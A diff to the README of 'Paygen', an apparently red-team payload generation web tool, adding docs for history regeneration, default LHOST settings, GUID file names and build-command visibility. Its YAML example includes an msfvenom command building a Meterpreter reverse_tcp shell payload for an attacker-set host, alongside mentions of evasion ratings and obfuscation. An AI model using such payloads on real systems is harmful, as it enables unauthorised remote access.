@@ -27,11 +27,15 @@ Paygen is a web-based payload generation framework for security researchers and 
 - 🎯 **MITRE ATT&CK** - Built-in tactic and technique mappings
 - 📊 **Effectiveness** - HIGH/MEDIUM/LOW evasion ratings
 - 📜 **History** - Track all builds with parameters and launch instructions
+  - 🔄 **Instant Regenerate** - Replay previous payloads with same parameters
+  - ✏️ **Modify & Regenerate** - Load parameters into form for editing before regeneration
+- ⚙️ **Settings** - Configure default values (LHOST) persisted in browser
 - ⚡ **Flexible** - Template-based (C#, PS1) and command-based (msfvenom)
 - 🔍 **Search** - Quickly find recipes with built-in search functionality
 - ✅ **Validation** - Real-time parameter validation (IP, port, paths, hex)
 - 🎛️ **Build Options** - Remove comments, console output, strip binaries
 - 🔐 **PowerShell Obfuscation** - Integrated psobf with 3 levels and automatic failover
+- 📋 **Command Transparency** - View compilation and shellcode generation commands in build output
 
 ---
 
@@ -263,6 +267,68 @@ Set the shellcode configuration path in `~/.config/paygen/config.yaml`:
 ```yaml
 shellcodes_config: "~/Documents/Tools/paygen/shellcodes.yaml"
 ```
+
+### Advanced Shellcode Features
+
+#### GUID Variable Support
+
+Use `{{guid}}` in shellcode commands for unique file names:
+
+```yaml
+- name: "Msfvenom shellcode"
+  shellcode: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f raw -o /tmp/shellcode-{{ guid }}.bin
+  parameters:
+    - name: "lhost"
+      type: "ip"
+      required: true
+```
+
+A unique GUID is generated for each build, preventing file collisions.
+
+#### Option Parameters
+
+Use `option` type for dropdown selections:
+
+```yaml
+parameters:
+  - name: "format"
+    type: "option"
+    description: "Output format for shellcode"
+    required: true
+    options: ["raw", "csharp", "python", "c", "hex"]
+    default: "raw"
+```
+
+This creates a dropdown in the UI. Use as: `-f {{ format }}`
+
+---
+
+## Web Interface Features
+
+### Settings
+
+Click the **⚙️ Settings** button (top-right) to configure:
+
+- **Default LHOST** - Automatically pre-fills all LHOST parameters (recipes, shellcodes, cradles)
+- Settings are saved in browser localStorage (per-device)
+
+### History Management
+
+The **📜 History** button provides powerful build tracking:
+
+- **Instant Regenerate** - Click "Regenerate" to replay a payload with identical parameters
+- **Modify & Regenerate** - Click "Modify & Regenerate" to load parameters into the form for editing before regeneration
+- **Build Options Display** - View all language-specific and build options used for each generation
+- **Lazy Loading** - Fast performance even with large history files (100 recent builds shown)
+
+### Command Transparency
+
+Build output shows exact commands executed:
+
+- **Shellcode Generation** - View msfvenom/sliver commands with all parameters
+- **Compilation** - See compiler commands (mcs, gcc) with flags and paths
+
+This helps verify parameters are correctly applied and aids debugging.
 
 ---
 
